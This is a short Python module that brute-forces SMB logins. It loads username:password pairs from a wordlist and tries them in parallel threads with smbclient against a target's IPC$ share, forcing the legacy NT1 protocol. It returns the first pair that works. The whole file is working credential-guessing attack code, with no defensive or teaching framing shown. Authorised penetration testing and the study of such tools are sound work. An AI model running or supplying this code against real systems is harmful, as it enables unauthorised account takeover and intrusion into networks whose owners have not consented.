# === modules/brute.py ===
from concurrent.futures import ThreadPoolExecutor
import os
import subprocess

def try_login(ip, username, password):
    cmd = ["smbclient", f"//{ip}/IPC$", "-U", f"{username}%{password}", "-m", "NT1"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def run_brute_force(ip, wordlist_path, threads):
    with open(wordlist_path) as f:
        lines = f.read().splitlines()
    combos = [line.split(":") for line in lines if ":" in line]
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(try_login, ip, u, p) for u, p in combos]
        for i, f in enumerate(futures):
            if f.result():
                return combos[i]
    return None
